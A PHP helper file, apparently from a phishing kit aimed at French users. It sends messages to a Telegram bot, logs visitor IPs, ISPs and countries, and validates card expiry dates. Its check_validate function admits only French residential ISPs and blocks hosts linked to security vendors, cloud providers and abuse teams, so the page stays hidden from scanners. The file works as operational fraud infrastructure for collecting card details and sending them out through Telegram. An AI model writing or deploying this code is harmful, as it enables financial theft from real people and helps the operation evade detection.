<?php
function go_to($xurl){
    return header('Location:'.$xurl); exit();
}
function get_client_ip() {
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];
    if(filter_var($client, FILTER_VALIDATE_IP)):
        $ip = $client;
    elseif(filter_var($forward, FILTER_VALIDATE_IP)):
        $ip = $forward;
    else:
        $ip = $remote;
    endif;
    if($ip == '::1'):
        return '127.0.0.1';
    endif;
    return  $ip;
}

function system_opiration($user_agent){
    $erreur_systeme = "Unknown OS Platform";
    $OS = array(
        '/windows nt 10/i' => 'Windows 10',
        '/windows nt 6.3/i' => 'Windows 8.1',
        '/windows nt 6.2/i' => 'Windows 8',
        '/windows nt 6.1/i' => 'Windows 7',
        '/windows nt 6.0/i' => 'Windows Vista',
        '/windows nt 5.2/i' => 'Windows Server 2003/XP x64',
        '/windows nt 5.1/i' => 'Windows XP',
        '/windows xp/i' => 'Windows XP',
        '/windows nt 5.0/i' => 'Windows 2000',
        '/windows me/i' => 'Windows ME',
        '/win98/i' => 'Windows 98',
        '/win95/i' => 'Windows 95',
        '/win16/i' => 'Windows 3.11',
        '/macintosh|mac os x/i' => 'Mac OS X',
        '/mac_powerpc/i' => 'Mac OS 9',
        '/linux/i' => 'Linux',
        '/ubuntu/i' => 'Ubuntu',
        '/iphone/i' => 'iPhone',
        '/ipod/i' => 'iPod',
        '/ipad/i' => 'iPad',
        '/android/i' => 'Android',
        '/blackberry/i' => 'BlackBerry',
        '/webos/i' => 'Mobile'
    );
    foreach ($OS as $regex => $value):
        if (preg_match($regex, $user_agent)):        
            $erreur_systeme = $value;
        endif;

    endforeach;
    return $erreur_systeme;
}

function navigation($user_agent){
    $erreur_navigateur = "Unknown Browser";
    $navigateur = array(
        '/msie/i' => 'Internet Explorer',
        '/firefox/i' => 'Firefox',
        '/safari/i' => 'Safari',
        '/chrome/i' => 'Chrome',
        '/edge/i' => 'Edge',
        '/opera/i' => 'Opera',
        '/netscape/i' => 'Netscape',
        '/maxthon/i' => 'Maxthon',
        '/konqueror/i' => 'Konqueror',
        '/mobile/i' => 'Handheld Browser'
    );
    foreach ($navigateur as $regex => $value):
        if (preg_match($regex, $user_agent)):
            $erreur_navigateur = $value;
        endif;
    endforeach;
    return $erreur_navigateur;
}


function extract_url(){
    return $links_ex = $_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];
}

function files(){
    return $links = $_SERVER['REQUEST_URI'];
}



function grabinfos($ip){
    if($ip == '127.0.0.1'):
        $ip = realIP;
    endif;
    $ch = curl_init('http://ipwhois.app/json/'.$ip);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $json = curl_exec($ch);
    curl_close($ch);

    // Decode JSON response
    $ipwhois_result = json_decode($json, true);
    return $ipwhois_result;
}

function randoms_string($length){
    $characters = 'abcdefjhigklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString = '';
    for ($i = 0;$i < $length;$i++):
        $randomString .= $characters[rand(0, $charactersLength - 1) ];
    endfor;
    return $randomString;
}


function validate_number($number,$length = null) {
    if (is_numeric($number)):
        if( $length == null ):
            return true;
        else:
            if( $length == strlen($number) )
                return true;
            return false;
        endif;
    else:
        return false;
    endif;
}
function vers_telegram($message,$api,$chat_id){
    $local_url = "https://api.telegram.org/bot".$api;
    $params=[
        'chat_id'=> $chat_id,
        'text'=> $message,
    ];
    $init = curl_init();
    curl_setopt_array($init, array(
        CURLOPT_URL				=> $local_url."/sendMessage",
        CURLOPT_HEADER			=> false,
        CURLOPT_RETURNTRANSFER	=> TRUE,
        CURLOPT_POST            => 1,
        CURLOPT_POSTFIELDS      => ($params),
        CURLOPT_SSL_VERIFYPEER  => false

        ));
    $details = curl_exec($init); 
    curl_close($init);
    return true;
}

function save_to_txt($text,$file){
    $result = @fopen("./logs/".$file, "a+");   
    fwrite($result, $text);
    fclose($result);
    return true;
}

function contrys($ip){
    $isp = grabinfos($ip);
    $isp_cont = $isp['country'];
    return $isp_cont;
}

function valid_email($email){
    if(filter_var($email,FILTER_VALIDATE_EMAIL)):
        return true;
    else:
        return false;
    endif;
    return false;
}

function visiteur($status,$ip){
    $detect = new BrowserDetection();
    //$ip = get_client_ip();
    $date = date("H:i:s d/m/Y", time());
    $isp = grabinfos($ip);
    $user_agent = $_SERVER['HTTP_USER_AGENT'];
    $browser_name = $detect->getName();
    $browserVer     = $detect->getVersion();
    $isMobile       = ($detect->isMobile()) ? 'Mobile' : 'Not mobile';
    $platformName   = $detect->getPlatform();
    $isp_isp = $isp['isp'];
    $isp_org = $isp['org'];
    $isp_cont = $isp['country'];

    $str = "<tr><th scope='row'>$ip</th> <th>$status</th> <th>$date</th> <th>$isp_isp</th> <th>$isp_org</th> <th>$isp_cont</th> <th>[$isMobile]</th> <th>$platformName</th> <th>$browser_name</th> </tr>";
    file_put_contents('visit.html', $str  , FILE_APPEND | LOCK_EX);
    return true;


}

function checkdota($hoha){
    //$hoha = "sko.php";
    if(!file_exists($hoha) && !is_file($hoha)):
        $handle = fopen($hoha, 'w') or die('Cannot open file:  '.$hoha);
        $data = "<!DOCTYPE html><html><head><style>*{margin:0;padding:0;}</style></head><div style='width:100%;text-align:center;height:50px;line-height:50px;background-color:orange;color:blue;'><h2><b>GHOST TASK SHOW VISTOR</b></h2></div></html>";
        fwrite($handle, $data);
        //mkdir($hoha);
    endif;
}
function Add_User($ip)
{
    global $country, $current_date, $Douc_R;
    $hostnamee = gethostbyaddr($ip);
    $user_list = @fopen($Douc_R."./Visitor.txt","a+");
    fwrite($user_list,"TRUE | IP : ".$ip." | Time : ".$current_date." | COUNTRY : [".$country."] | Host : ".$hostnamee."\r\n");
    fclose($user_list);
}
function static_user($ip,$user_agent,$current_date )
{
    global $country, $Douc_Rs;
    $links = files();
    $hostnamee = gethostbyaddr($ip);
    $user_list = @fopen($Douc_Rs."static.txt","a+");
    fwrite($user_list,"INFO | IP : ".$ip." | Time : ".$current_date." | COUNTRY : [".$country."] | Host : ".$hostnamee." | User_agent : ".$user_agent."| File : ".$links."\r\n");
    fclose($user_list);
}

function Add_block($ip)
{
    global $country, $current_date, $Douc_R;
    $hostnamee = gethostbyaddr($ip);
    $user_list = @fopen($Douc_R."./Visitor_block.txt","a+");
    fwrite($user_list,"FALSE | IP : ".$ip." | Time : ".$current_date." | COUNTRY : [".$country."] | Host : ".$hostnamee."\r\n");
    fclose($user_list);
}


function Save_logs_html($inTo,$data)
{
    $fp = fopen($inTo, "a");
    fputs($fp, $data);
    fclose($fp);
}
function validate_cc_date($month,$year) {
    if( validate_number(trim($month)) && strlen(trim($month)) == 2 && validate_number(trim($year)) && strlen(trim($year)) == 4 ):
        return true;
    else:
        return false;
    endif;
}



function check_validate($ip,$data){
    $founda = false;
    $isp = "";
    $user = $ip;
    $hostname = gethostbyaddr($ip);
    $user1 = explode(".",$user);
    $user2 = array_reverse($user1);
    $comma_user = implode(".", $user2);
    $isok = array(
        'orange.fr',
        'wanadoo.fr',
        'sfr.fr',
        'sfr',
        'orange',
        'free',
        'sfr.net',
        'club-internet.fr',
        'bbox.net',
        'bouygues',
        'proxad.net',
        'bbox.fr',
        'Free Mobile',
        'numericable.fr'
    );
    $notok = array(
        'ppp',
        'ovh',
        'Google',
        'Bitdefender',
        'Microsoft',
        'cloud',
        'abuse',
        'avast',
        'amazon',
        'oleane',
        'oleane.fr'

    );

    if($hostname == $ip || $hostname == $comma_user.".in-addr.arpa" || $hostname !== $user):
        $isp = strtolower($data['org'])."|".strtolower($data['isp'])."|".strtolower($hostname);
    else:
        $isp = strtolower($hostname);
    endif;
 
    foreach($isok as $value):
        if(strpos($isp,strtolower($value)) !== false):
            $founda = true;
            break;            
        endif;
    endforeach;
    foreach($notok as $baned):
        if(strpos($isp,strtolower($baned)) !== false):
            $founda = false;
            break;          
        endif;
    endforeach;
    return $founda;

}








